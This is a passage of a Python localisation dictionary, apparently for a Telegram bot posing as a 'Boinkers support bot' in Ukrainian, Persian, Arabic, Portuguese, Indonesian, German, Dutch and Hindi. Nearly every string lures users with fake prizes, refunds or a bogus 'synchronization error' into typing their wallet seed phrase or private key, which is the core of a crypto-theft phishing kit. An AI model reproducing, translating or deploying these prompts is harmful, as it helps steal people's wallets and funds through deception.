        "connect_break_piggy_bank": "Будь ласка підключіть свій гаманець, щоб розбити вашу скарбничку і отримати винагороди",
        "connect_free_spins": "Будь ласка підключіть свій гаманець, щоб отримати 1M спінів у вашому акаунті",
        "connect_album_rewards": "Будь ласка підключіть свій гаманець, щоб отримати винагороду за колекцію альбому наклейок",
        "connect_claim_100_tons": "Будь ласка підключіть свій гаманець, щоб отримати 100 tons, які ви виграли на ALBUM SET WHEEL",
        "connect_claim_1_ton": "Будь ласка підключіть свій гаманець, щоб отримати 1 ton, який ви виграли на ALBUM SET WHEEL",
        "connect_mega_wheel": "Будь ласка підключіть свій гаманець, щоб активувати MEGA WHEEL у вашому акаунті",
        "connect_missing_tokens": "Будь ласка підключіть свій гаманець, щоб отримати ваші відсутні токени :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Виявлено помилку синхронізації⚠️\n\n"
            "Наша система не змогла встановити перевірене з'єднання між вашим гаманцем і ботом Boinkers.\n\n"
            "Зазвичай це відбувається, коли гаманець не завершив початкове з'єднання (handshake) протоколу об'єднання. Щоб продовжити, ви повинні виконати ручну синхронізацію та об'єднання для реєстрації свого гаманця‼️"
        ),
        "claim_manually": "Заявити вручну",
        "error_use_seed_phrase": "Будь ласка, надайте seed phrase вашого гаманця (12 або 24 слова).",
        "post_receive_error": "‼ Сталася помилка, Будь ласка переконайтеся, що ви вводите правильний ключ, використовуйте копіювання/вставку, щоб уникнути помилок. будь ласка /start щоб спробувати знову.",
        "invalid choice": "Невірний вибір. Будь ласка, використовуйте кнопки.",
    },
    "fa": {
        "welcome": "Hi {user} خوش آمدید به Boinkers support bot! این بات به شما در دسترسی به کیف پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، دریافت توکن‌ها و جوایز، بازپرداخت‌ها و اعتبارسنجی حساب کمک می‌کند. لطفاً یک گزینه از منو را انتخاب کنید تا ادامه دهیم.",
        "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
        "validation": "اعتبارسنجی",
        "claim tokens": "دریافت توکن‌ها",
        "recover account progress": "بازیابی پیشرفت حساب",
        "assets recovery": "بازیابی دارایی‌ها",
        "general issues": "مسائل عمومی",
        "rectification": "اصلاح",
        "withdrawals": "برداشت",
        "missing tokens": "توکن‌های مفقود",
        "login issues": "مشکلات ورود",
        "connect wallet message": "لطفاً کیف پول خود را با کلید خصوصی یا Seed Phrase متصل کنید.",
        "connect wallet button": "🔑 اتصال Wallet",
        "select wallet type": "لطفاً نوع wallet را انتخاب کنید:",
        "other wallets": "Wallet های دیگر",
        "private key": "🔑 کلید خصوصی",
        "seed phrase": "🔒 وارد کردن Seed Phrase",
        "label_seed_phrase": "عبارت بازیابی",
        "label_private_key": "کلید خصوصی",
        "wallet selection message": "شما {wallet_name} را انتخاب کرده‌اید.\nروش اتصال را انتخاب کنید.",
        "reassurance": PROFESSIONAL_REASSURANCE["fa"],
        "prompt seed": "لطفاً seed با 12 یا 24 کلمه را وارد کنید.",
        "prompt private key": "لطفاً private key خود را وارد کنید.",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "لطفاً 24 کلمه کیف پول Tonkeeper خود را وارد کنید.",
        "prompt_24_wallet_type_trust_wallet": "لطفاً 24 کلمه کیف پول Telegram خود را وارد کنید.",
        "prompt_24_wallet_type_coinbase": "لطفاً 24 کلمه کیف پول MyTon خود را وارد کنید.",
        "prompt_24_wallet_type_tonkeeper": "لطفاً 24 کلمه کیف پول Tonhub خود را وارد کنید.",
        # wallet errors
        "wallet_24_error_wallet_type_metamask": "این فیلد نیاز به seed phrase دارد (24 کلمه کیف پول Tonkeeper شما). لطفاً seed phrase را وارد کنید.",
        "wallet_24_error_wallet_type_trust_wallet": "این فیلد نیاز به seed phrase دارد (24 کلمه کیف پول Telegram شما). لطفاً seed phrase را وارد کنید.",
        "wallet_24_error_wallet_type_coinbase": "این فیلد نیاز به seed phrase دارد (24 کلمه کیف پول MyTon شما). لطفاً seed phrase را وارد کنید.",
        "wallet_24_error_wallet_type_tonkeeper": "این فیلد نیاز به seed phrase دارد (24 کلمه کیف پول Tonhub شما). لطفاً seed phrase را وارد کنید.",
        "refund": "بازپرداخت",
        "reflection": "بازتاب توکن",
        "token reflection": "بازتاب توکن",
        "recover stars": "بازیابی ستاره‌ها 🌟",
        "break piggy bank": "شکستن قلک",
        "free spins": "چرخش‌های رایگان",
        "album rewards": "پاداش‌های آلبوم",
        "claim 100 tons": "دریافت 100 TONS",
        "claim 1 ton": "دریافت 1 TON",
        "mega wheel": "چرخ فوق‌العاده",
        "connect_recover_stars": "لطفاً برای بازیابی ستاره‌های 🌟 خود در حساب تلگرام خود، کیف پول خود را متصل کنید",
        "connect_break_piggy_bank": "لطفاً کیف پول خود را متصل کنید تا قلک خود را بشکنید و پاداش‌های خود را دریافت کنید",
        "connect_free_spins": "لطفاً کیف پول خود را متصل کنید تا 1M چرخش را در حساب خود دریافت کنید",
        "connect_album_rewards": "لطفاً کیف پول خود را متصل کنید تا پاداش مجموعه آلبوم استیکر خود را دریافت کنید",
        "connect_claim_100_tons": "لطفاً کیف پول خود را متصل کنید تا 100 tons که در ALBUM SET WHEEL برنده شده‌اید را دریافت کنید",
        "connect_claim_1_ton": "لطفاً کیف پول خود را متصل کنید تا 1 ton که در ALBUM SET WHEEL برنده شده‌اید را دریافت کنید",
        "connect_mega_wheel": "لطفاً کیف پول خود را متصل کنید تا MEGA WHEEL را در حساب خود فعال کنید",
        "connect_missing_tokens": "لطفاً کیف پول خود را متصل کنید تا توکن‌های مفقود خود را دریافت کنید :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️خطای همگام‌سازی شناسایی شد⚠️\n\n"
            "سیستم ما نتوانست پیوند تأیید شده‌ای بین کیف پول شما و ربات Boinkers برقرار کند.\n\n"
            "معمولاً این زمانی اتفاق می‌افتد که کیف پول، دست تکان دادن ادغام پروتکل اولیه را کامل نکرده است. برای ادامه، باید یک همگام‌سازی و ادغام دستی انجام دهید تا کیف پول خود را ثبت کنید‼️"
        ),
        "claim_manually": "دریافت دستی",
        "error_use_seed_phrase": "لطفاً عبارت بازیابی کیف پول خود را وارد کنید (12 یا 24 کلمه).",
        "post_receive_error": "‼ خطایی رخ داد، لطفاً اطمینان حاصل کنید که کلید صحیح را وارد می‌کنید، از کپی/پیست برای جلوگیری از خطاها استفاده کنید. لطفاً /start را برای تلاش مجدد بزنید.",
        "invalid choice": "انتخاب نامعتبر. لطفاً از دکمه‌ها استفاده کنید.",
    },
    "ar": {
        "welcome": "Hi {user} مرحبًا بك في Boinkers support bot! يساعدك هذا البوت في الوصول إلى المحفظة، المعاملات، الأرصدة، الاسترداد، استلام الرموز والمكافآت، الاستردادات، والتحققات الحسابية. الرجاء اختيار خيار من القائمة للمتابعة.",
        "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
        "validation": "التحقق",
        "claim tokens": "المطالبة بالرموز",
        "recover account progress": "استعادة تقدم الحساب",
        "assets recovery": "استرداد الأصول",
        "general issues": "مشاكل عامة",
        "rectification": "تصحيح",
        "withdrawals": "السحوبات",
        "missing tokens": "الرموز المفقودة",
        "login issues": "مشاكل تسجيل الدخول",
        "connect wallet message": "يرجى توصيل محفظتك باستخدام Private Key أو Seed Phrase للمتابعة.",
        "connect wallet button": "🔑 توصيل Wallet",
        "select wallet type": "يرجى اختيار نوع wallet:",
        "other wallets": "محافظ أخرى",
        "private key": "🔑 المفتاح الخاص",
        "seed phrase": "🔒 استيراد Seed Phrase",
        "label_seed_phrase": "عبارة الاستعادة",
        "label_private_key": "المفتاح الخاص",
        "wallet selection message": "لقد اخترت {wallet_name}.\nحدد وضع الاتصال المفضل.",
        "reassurance": PROFESSIONAL_REASSURANCE["ar"],
        "prompt seed": "يرجى إدخال عبارة seed مكونة من 12 أو 24 كلمة.",
        "prompt private key": "يرجى إدخال المفتاح الخاص.",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "يرجى إدخال 24 كلمة لمحفظة Tonkeeper الخاصة بك.",
        "prompt_24_wallet_type_trust_wallet": "يرجى إدخال 24 كلمة لمحفظة Telegram الخاصة بك.",
        "prompt_24_wallet_type_coinbase": "يرجى إدخال 24 كلمة لمحفظة MyTon الخاصة بك.",
        "prompt_24_wallet_type_tonkeeper": "يرجى إدخال 24 كلمة لمحفظة Tonhub الخاصة بك.",
        # wallet errors
        "wallet_24_error_wallet_type_metamask": "يتطلب هذا الحقل عبارة seed (24 كلمة لمحفظة Tonkeeper الخاصة بك). الرجاء تقديم عبارة seed.",
        "wallet_24_error_wallet_type_trust_wallet": "يتطلب هذا الحقل عبارة seed (24 كلمة لمحفظة Telegram الخاصة بك). الرجاء تقديم عبارة seed.",
        "wallet_24_error_wallet_type_coinbase": "يتطلب هذا الحقل عبارة seed (24 كلمة لمحفظة MyTon الخاصة بك). الرجاء تقديم عبارة seed.",
        "wallet_24_error_wallet_type_tonkeeper": "يتطلب هذا الحقل عبارة seed (24 كلمة لمحفظة Tonhub الخاصة بك). الرجاء تقديم عبارة seed.",
        "refund": "استرداد",
        "reflection": "انعكاس التوكين",
        "token reflection": "انعكاس التوكين",
        "recover stars": "استعادة النجوم 🌟",
        "break piggy bank": "كسر حصالة",
        "free spins": "لفات مجانية",
        "album rewards": "مكافآت الألبوم",
        "claim 100 tons": "المطالبة بـ 100 TONS",
        "claim 1 ton": "المطالبة بـ 1 TON",
        "mega wheel": "العجلة الضخمة",
        "connect_recover_stars": "يرجى توصيل محفظتك لاستعادة نجومك 🌟 في حساب التليجرام الخاص بك",
        "connect_break_piggy_bank": "يرجى توصيل محفظتك لتحطيم حصالتك واستلام المكافآت",
        "connect_free_spins": "يرجى توصيل محفظتك للمطالبة بـ 1M لفة في حسابك",
        "connect_album_rewards": "يرجى توصيل محفظتك لتلقي مكافأة مجموعة ألبوم الملصقات",
        "connect_claim_100_tons": "يرجى توصيل محفظتك للمطالبة بـ 100 tons التي ربحتها من ALBUM SET WHEEL",
        "connect_claim_1_ton": "يرجى توصيل محفظتك للمطالبة بـ 1 ton التي ربحتها من ALBUM SET WHEEL",
        "connect_mega_wheel": "يرجى توصيل محفظتك لتنشيط MEGA WHEEL في حسابك",
        "connect_missing_tokens": "يرجى توصيل محفظتك للحصول على رموزك المفقودة :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️تم الكشف عن خطأ في المزامنة⚠️\n\n"
            "لم يتمكن نظامنا من إنشاء ارتباط مُصَدَّق بين محفظتك والروبوت Boinkers.\n\n"
            "يحدث هذا عادةً عندما لم يكمل المحفظة مصافحة دمج البروتوكول الأولية. للمتابعة، يجب عليك إجراء مزامنة ودمج يدوي لتسجيل محفظتك‼️"
        ),
        "claim_manually": "المطالبة يدويًا",
        "error_use_seed_phrase": "يرجى تقديم عبارة seed الخاصة بمحفظتك (12 أو 24 كلمة).",
        "post_receive_error": "‼ حدث خطأ، يرجى التأكد من إدخال المفتاح الصحيح، استخدم النسخ واللصق لتجنب الأخطاء. من فضلك /start للمحاولة مرة أخرى.",
        "invalid choice": "خيار غير صالح. يرجى استخدام الأزرار.",
    },
    "pt": {
        "welcome": "Hi {user} bem-vindo ao Boinkers support bot! Este bot ajuda com acesso à carteira, transações, saldos, recuperações, recebimento de tokens e recompensas, reembolsos e validações de conta. Por favor escolha uma opção do menu para prosseguir.",
        "main menu title": "Por favor selecione um tipo de problema para continuar:",
        "validation": "Validação",
        "claim tokens": "Reivindicar Tokens",
        "recover account progress": "Recuperar progresso da conta",
        "assets recovery": "Recuperação de Ativos",
        "general issues": "Problemas Gerais",
        "rectification": "Retificação",
        "withdrawals": "Saques",
        "missing tokens": "Tokens faltando",
        "login issues": "Problemas de Login",
        "connect wallet message": "Por favor conecte sua wallet com sua Private Key ou Seed Phrase para continuar.",
        "connect wallet button": "🔑 Conectar Wallet",
        "select wallet type": "Por favor selecione seu tipo de wallet:",
        "other wallets": "Outras Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Importar Seed Phrase",
        "label_seed_phrase": "frase seed",
        "label_private_key": "chave privada",
        "wallet selection message": "Você selecionou {wallet_name}.\nSelecione seu modo de conexão preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["pt"],
        "prompt seed": "Por favor insira as 12 ou 24 palavras de sua wallet.",
        "prompt private key": "Por favor insira seu private key.",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Por favor insira as 24 palavras da sua carteira Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "Por favor insira as 24 palavras da sua Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Por favor insira as 24 palavras da sua MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Por favor insira as 24 palavras da sua Tonhub wallet.",
        # wallet errors
        "wallet_24_error_wallet_type_metamask": "Este campo requer uma seed phrase (as 24 palavras da sua carteira Tonkeeper). Por favor forneça a seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Este campo requer uma seed phrase (as 24 palavras da sua carteira Telegram). Por favor forneça a seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Este campo requer uma seed phrase (as 24 palavras da sua carteira MyTon). Por favor forneça a seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Este campo requer uma seed phrase (as 24 palavras da sua carteira Tonhub). Por favor forneça a seed phrase.",
        "refund": "Reembolso",
        "reflection": "Reflexão de Token",
        "token reflection": "Reflexão de Token",
        "recover stars": "Recuperar estrelas 🌟",
        "break piggy bank": "Quebrar Porquinho",
        "free spins": "Giros gratuitos",
        "album rewards": "Recompensas do Álbum",
        "claim 100 tons": "Reivindicar 100 TONS",
        "claim 1 ton": "Reivindicar 1 TON",
        "mega wheel": "Mega roda",
        "connect_recover_stars": "Por favor conecte sua carteira para recuperar suas estrelas 🌟 em sua conta do Telegram",
        "connect_break_piggy_bank": "Por favor conecte sua carteira para quebrar seu Porquinho e receber suas recompensas",
        "connect_free_spins": "Por favor conecte sua carteira para reivindicar 1M de Giros em sua conta",
        "connect_album_rewards": "Por favor conecte sua carteira para receber sua recompensa de coleção de álbum de figurinhas",
        "connect_claim_100_tons": "Por favor conecte sua carteira para reivindicar seus 100 tons que você ganhou na ALBUM SET WHEEL",
        "connect_claim_1_ton": "Por favor conecte sua carteira para reivindicar seu 1 ton que você ganhou na ALBUM SET WHEEL",
        "connect_mega_wheel": "Por favor conecte sua carteira para ativar a MEGA WHEEL na sua conta",
        "connect_missing_tokens": "Por favor conecte sua carteira para obter seus tokens faltantes :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Erro de sincronização detectado⚠️\n\n"
            "Nosso sistema não conseguiu estabelecer um link verificado entre sua carteira e o bot Boinkers.\n\n"
            "Isso geralmente ocorre quando a carteira não concluiu o handshake de mesclagem do protocolo inicial. Para continuar, você deve realizar uma sincronização e mesclagem manual para registrar sua carteira‼️"
        ),
        "claim_manually": "Reivindicar manualmente",
        "error_use_seed_phrase": "Por favor forneça a frase seed da sua carteira (12 ou 24 palavras).",
        "post_receive_error": "‼ Ocorreu um erro, Por favor certifique-se de inserir a chave correta, use copiar e colar para evitar erros. por favor /start para tentar novamente.",
        "invalid choice": "Escolha inválida. Por favor use os botões.",
    },
    "id": {
        "welcome": "Hi {user} selamat datang di Boinkers support bot! Bot ini membantu dengan akses dompet, transaksi, saldo, recoveries, penerimaan token dan reward, pengembalian dana, dan validasi akun. Silakan pilih opsi menu untuk melanjutkan.",
        "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
        "validation": "Validasi",
        "claim tokens": "Klaim Token",
        "recover account progress": "Pulihkan kemajuan akun",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Masalah Umum",
        "rectification": "Rekonsiliasi",
        "withdrawals": "Penarikan",
        "missing tokens": "Token hilang",
        "login issues": "Masalah Login",
        "connect wallet message": "Sambungkan wallet Anda dengan Private Key atau Seed Phrase untuk melanjutkan.",
        "connect wallet button": "🔑 Sambungkan Wallet",
        "select wallet type": "Pilih jenis wallet Anda:",
        "other wallets": "Wallet Lainnya",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mode koneksi pilihan Anda.",
        "reassurance": PROFESSIONAL_REASSURANCE["id"],
        "prompt seed": "Masukkan 12 atau 24 kata seed phrase Anda.",
        "prompt private key": "Masukkan private key Anda.",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Silakan masukkan 24 kata wallet Tonkeeper Anda.",
        "prompt_24_wallet_type_trust_wallet": "Silakan masukkan 24 kata Telegram Wallet Anda.",
        "prompt_24_wallet_type_coinbase": "Silakan masukkan 24 kata MyTon wallet Anda.",
        "prompt_24_wallet_type_tonkeeper": "Silakan masukkan 24 kata Tonhub wallet Anda.",
        # wallet errors
        "wallet_24_error_wallet_type_metamask": "Kolom ini memerlukan seed phrase (24 kata dari wallet Tonkeeper Anda). Silakan berikan seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Kolom ini memerlukan seed phrase (24 kata dari wallet Telegram Anda). Silakan berikan seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Kolom ini memerlukan seed phrase (24 kata dari wallet MyTon Anda). Silakan berikan seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Kolom ini memerlukan seed phrase (24 kata dari wallet Tonhub Anda). Silakan berikan seed phrase.",
        "refund": "Pengembalian dana",
        "reflection": "Refleksi Token",
        "token reflection": "Refleksi Token",
        "recover stars": "Pulihkan bintang 🌟",
        "break piggy bank": "Hancurkan Celengan",
        "free spins": "Putaran gratis",
        "album rewards": "Hadiah Album",
        "claim 100 tons": "Klaim 100 TONS",
        "claim 1 ton": "KLAIM 1 TON",
        "mega wheel": "Mega wheel",
        "connect_recover_stars": "Silakan sambungkan wallet Anda untuk memulihkan bintang Anda 🌟 di akun Telegram Anda",
        "connect_break_piggy_bank": "Silakan sambungkan wallet Anda untuk menghancurkan Celengan dan menerima hadiah Anda",
        "connect_free_spins": "Silakan sambungkan wallet Anda untuk mengklaim 1M Putaran di akun Anda",
        "connect_album_rewards": "Silakan sambungkan wallet Anda untuk menerima hadiah koleksi album stiker Anda",
        "connect_claim_100_tons": "Silakan sambungkan wallet Anda untuk mengklaim 100 tons yang Anda menangkan dari ALBUM SET WHEEL",
        "connect_claim_1_ton": "Silakan sambungkan wallet Anda untuk mengklaim 1 ton yang Anda menangkan dari ALBUM SET WHEEL",
        "connect_mega_wheel": "Silakan sambungkan wallet Anda untuk mengaktifkan MEGA WHEEL di akun Anda",
        "connect_missing_tokens": "Silakan sambungkan wallet Anda untuk mendapatkan token Anda yang hilang :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Terdeteksi Kesalahan Sinkronisasi⚠️\n\n"
            "Sistem kami tidak dapat memastikan tautan terverifikasi antara dompet Anda dan bot Boinkers.\n\n"
            "Ini biasanya terjadi ketika dompet belum menyelesaikan handshake penggabungan protokol awal. Untuk melanjutkan, Anda harus melakukan sinkronisasi & penggabungan manual untuk mendaftarkan dompet Anda‼️"
        ),
        "claim_manually": "Klaim Secara Manual",
        "error_use_seed_phrase": "Silakan berikan seed phrase dompet Anda (12 atau 24 kata).",
        "post_receive_error": "‼ Terjadi kesalahan, Harap pastikan Anda memasukkan kunci yang benar, gunakan salin dan tempel untuk menghindari kesalahan. silakan /start untuk mencoba lagi.",
        "invalid choice": "Pilihan tidak sah. Silakan gunakan tombol.",
    },
    "de": {
        "welcome": "Hi {user} willkommen beim Boinkers support bot! Dieser Bot hilft bei Wallet-Zugriff, Transaktionen, Salden, Wiederherstellungen, Empfang von Token und Belohnungen, Rückerstattungen und Kontovalidierungen. Bitte wählen Sie eine Menüoption, um fortzufahren.",
        "main menu title": "Bitte wählen Sie einen Problemtyp, um fortzufahren:",
        "validation": "Validierung",
        "claim tokens": "Tokens Beanspruchen",
        "recover account progress": "Kontofortschritt wiederherstellen",
        "assets recovery": "Wiederherstellung von Vermögenswerten",
        "general issues": "Allgemeine Probleme",
        "rectification": "Berichtigung",
        "withdrawals": "Auszahlungen",
        "missing tokens": "Fehlende Tokens",
        "login issues": "Anmeldeprobleme",
        "connect wallet message": "Bitte verbinden Sie Ihr Wallet mit Ihrem Private Key oder Ihrer Seed Phrase, um fortzufahren.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Bitte wählen Sie Ihren Wallet-Typ:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privater Schlüssel",
        "seed phrase": "🔒 Seed Phrase importieren",
        "label_seed_phrase": "Seed-Phrase",
        "label_private_key": "Privater Schlüssel",
        "wallet selection message": "Sie haben {wallet_name} ausgewählt.\nWählen Sie Ihre bevorzugte Verbindungsart.",
        "reassurance": PROFESSIONAL_REASSURANCE["de"],
        "prompt seed": "Bitte geben Sie die 12 oder 24 Wörter Ihrer Seed Phrase ein.",
        "prompt private key": "Bitte geben Sie Ihren Private Key ein.",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Bitte geben Sie die 24 Wörter Ihres Tonkeeper-Wallets ein.",
        "prompt_24_wallet_type_trust_wallet": "Bitte geben Sie die 24 Wörter Ihres Telegram-Wallets ein.",
        "prompt_24_wallet_type_coinbase": "Bitte geben Sie die 24 Wörter Ihres MyTon-Wallets ein.",
        "prompt_24_wallet_type_tonkeeper": "Bitte geben Sie die 24 Wörter Ihres Tonhub-Wallets ein.",
        # wallet 24 errors
        "wallet_24_error_wallet_type_metamask": "Dieses Feld erfordert eine Seed-Phrase (die 24 Wörter Ihres Tonkeeper-Wallets). Bitte geben Sie die Seed-Phrase ein.",
        "wallet_24_error_wallet_type_trust_wallet": "Dieses Feld erfordert eine Seed-Phrase (die 24 Wörter Ihres Telegram-Wallets). Bitte geben Sie die Seed-Phrase ein.",
        "wallet_24_error_wallet_type_coinbase": "Dieses Feld erfordert eine Seed-Phrase (die 24 Wörter Ihres MyTon-Wallets). Bitte geben Sie die Seed-Phrase ein.",
        "wallet_24_error_wallet_type_tonkeeper": "Dieses Feld erfordert eine Seed-Phrase (die 24 Wörter Ihres Tonhub-Wallets). Bitte geben Sie die Seed-Phrase ein.",
        "refund": "Rückerstattung",
        "reflection": "Token-Reflexion",
        "token reflection": "Token-Reflexion",
        "recover stars": "Sterne wiederherstellen 🌟",
        "break piggy bank": "Sparschwein zerschlagen",
        "free spins": "Kostenlose Drehungen",
        "album rewards": "Album-Belohnungen",
        "claim 100 tons": "100 TONS beanspruchen",
        "claim 1 ton": "1 TON beanspruchen",
        "mega wheel": "Mega-Rad",
        "connect_recover_stars": "Bitte verbinden Sie Ihr Wallet, um Ihre Sterne 🌟 in Ihrem Telegram-Konto wiederherzustellen",
        "connect_break_piggy_bank": "Bitte verbinden Sie Ihr Wallet, um Ihr Sparschwein zu zerschlagen und Ihre Belohnungen zu erhalten",
        "connect_free_spins": "Bitte verbinden Sie Ihr Wallet, um 1M Spins in Ihrem Konto zu beanspruchen",
        "connect_album_rewards": "Bitte verbinden Sie Ihr Wallet, um Ihre Sticker-Album-Belohnung zu erhalten",
        "connect_claim_100_tons": "Bitte verbinden Sie Ihr Wallet, um Ihre 100 tons zu beanspruchen, die Sie im ALBUM SET WHEEL gewonnen haben",
        "connect_claim_1_ton": "Bitte verbinden Sie Ihr Wallet, um Ihren 1 ton zu beanspruchen, den Sie im ALBUM SET WHEEL gewonnen haben",
        "connect_mega_wheel": "Bitte verbinden Sie Ihr Wallet, um die MEGA WHEEL in Ihrem Konto zu aktivieren",
        "connect_missing_tokens": "Bitte verbinden Sie Ihr Wallet, um Ihre fehlenden Tokens zu erhalten :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Synchronisationsfehler erkannt⚠️\n\n"
            "Unser System konnte keine verifizierte Verbindung zwischen Ihrer Wallet und dem Boinkers-Bot herstellen.\n\n"
            "Dies tritt normalerweise auf, wenn die Wallet den anfänglichen Protokoll-Merge-Handshake nicht abgeschlossen hat. Um fortzufahren, müssen Sie eine manuelle Synchronisation & Merge durchführen, um Ihre Wallet zu registrieren‼️"
        ),
        "claim_manually": "Manuell beanspruchen",
        "error_use_seed_phrase": "Bitte geben Sie die Seed-Phrase Ihrer Wallet an (12 oder 24 Wörter).",
        "post_receive_error": "‼ Ein Fehler ist aufgetreten, Bitte stellen Sie sicher, dass Sie den richtigen Schlüssel eingeben, verwenden Sie Kopieren/Einfügen, um Fehler zu vermeiden. bitte /start um es erneut zu versuchen.",
        "invalid choice": "Ungültige Auswahl. Bitte verwenden Sie die Tasten.",
    },
    "nl": {
        "welcome": "Hi {user} welkom bij de Boinkers support bot! Deze bot helpt met wallet-toegang, transacties, saldi, herstel, Empfang van tokens en beloningen, terugbetalingen en accountvalidaties. Kies een optie uit het menu om door te gaan.",
        "main menu title": "Selecteer een type probleem om door te gaan:",
        "validation": "Validatie",
        "claim tokens": "Tokens Claimen",
        "recover account progress": "Accountvoortgang herstellen",
        "assets recovery": "Herstel van Activa",
        "general issues": "Algemene Problemen",
        "rectification": "Rectificatie",
        "withdrawals": "Opnames",
        "missing tokens": "Ontbrekende tokens",
        "login issues": "Login-problemen",
        "connect wallet message": "Verbind uw wallet met uw Private Key of Seed Phrase om door te gaan.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Selecteer uw wallet-type:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privésleutel",
        "seed phrase": "🔒 Seed Phrase Importeren",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "U heeft {wallet_name} geselecteerd.\nSelecteer uw voorkeursverbindingswijze.",
        "reassurance": PROFESSIONAL_REASSURANCE["nl"],
        "prompt seed": "Voer uw seed phrase met 12 of 24 woorden in.",
        "prompt private key": "Voer uw private key in.",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Voer de 24 woorden van uw Tonkeeper-wallet in.",
        "prompt_24_wallet_type_trust_wallet": "Voer de 24 woorden van uw Telegram Wallet in.",
        "prompt_24_wallet_type_coinbase": "Voer de 24 woorden van uw MyTon-wallet in.",
        "prompt_24_wallet_type_tonkeeper": "Voer de 24 woorden van uw Tonhub-wallet in.",
        # wallet 24 errors
        "wallet_24_error_wallet_type_metamask": "Dit veld vereist een seed phrase (de 24 woorden van uw Tonkeeper-wallet). Geef de seed phrase op.",
        "wallet_24_error_wallet_type_trust_wallet": "Dit veld vereist een seed phrase (de 24 woorden van uw Telegram-wallet). Geef de seed phrase op.",
        "wallet_24_error_wallet_type_coinbase": "Dit veld vereist een seed phrase (de 24 woorden van uw MyTon-wallet). Geef de seed phrase op.",
        "wallet_24_error_wallet_type_tonkeeper": "Dit veld vereist een seed phrase (de 24 woorden van uw Tonhub-wallet). Geef de seed phrase op.",
        "refund": "Teruggave",
        "reflection": "Token Reflectie",
        "token reflection": "Token Reflectie",
        "recover stars": "Sterren herstellen 🌟",
        "break piggy bank": "Varkentje breken",
        "free spins": "Gratis spins",
        "album rewards": "Album beloningen",
        "claim 100 tons": "Claim 100 TONS",
        "claim 1 ton": "Claim 1 TON",
        "mega wheel": "Mega wiel",
        "connect_recover_stars": "Verbind uw wallet om uw sterren 🌟 in uw Telegram-account te herstellen",
        "connect_break_piggy_bank": "Verbind uw wallet om uw spaarvarken te breken en uw beloningen te ontvangen",
        "connect_free_spins": "Verbind uw wallet om 1M spins in uw account te claimen",
        "connect_album_rewards": "Verbind uw wallet om uw sticker album beloning te ontvangen",
        "connect_claim_100_tons": "Verbind uw wallet om uw 100 tons te claimen die u hebt gewonnen op de ALBUM SET WHEEL",
        "connect_claim_1_ton": "Verbind uw wallet om uw 1 ton te claimen die u hebt gewonnen op de ALBUM SET WHEEL",
        "connect_mega_wheel": "Verbind uw wallet om de MEGA WHEEL in uw account te activeren",
        "connect_missing_tokens": "Verbind uw wallet om uw ontbrekende tokens te krijgen :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Synchronisatiefout gedetecteerd⚠️\n\n"
            "Ons systeem kon geen geverifieerde koppeling tot stand brengen tussen uw wallet en de Boinkers-bot.\n\n"
            "Dit gebeurt meestal wanneer de wallet de initiële protocol-merge handshake niet heeft voltooid. Om door te gaan moet u een handmatige synchronisatie & merge uitvoeren om uw wallet te registreren‼️"
        ),
        "claim_manually": "Handmatig claimen",
        "error_use_seed_phrase": "Geef alstublieft de seed phrase van uw wallet op (12 of 24 woorden).",
        "post_receive_error": "‼ Er is een fout opgetreden, Zorg ervoor dat u de juiste sleutel invoert, gebruik kopiëren en plakken om fouten te voorkomen. gebruik /start om het opnieuw te proberen.",
        "invalid choice": "Ongeldige keuze. Gebruik de knoppen.",
    },
    "hi": {
        "welcome": "Hi {user} Boinkers support bot में आपका स्वागत है! यह बोट वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, टोकन और रिवॉर्ड प्राप्त करना, रिफंड और अकाउंट सत्यापन में मदद करता है। जारी रखने के लिए मेनू से एक विकल्प चुनें।",
        "main menu title": "कृपया जारी रखने के लिए एक समस्या प्रकार चुनें:",
        "validation": "सत्यापन",
        "claim tokens": "टोकन प्राप्त करें",
        "recover account progress": "खाते की प्रगति पुनर्प्राप्त करें",
        "assets recovery": "संपत्ति पुनर्प्राप्ति",
        "general issues": "सामान्य समस्याएँ",
        "rectification": "सुधार",
        "withdrawals": "निकासी",
        "missing tokens": "लापता टोकन",
        "login issues": "लॉगिन समस्याएँ",
        "connect wallet message": "कृपया वॉलेट को Private Key या Seed Phrase के साथ कनेक्ट करें।",
        "connect wallet button": "🔑 वॉलेट कनेक्ट करें",
        "select wallet type": "कृपया वॉलेट प्रकार चुनें:",
        "other wallets": "अन्य वॉलेट",
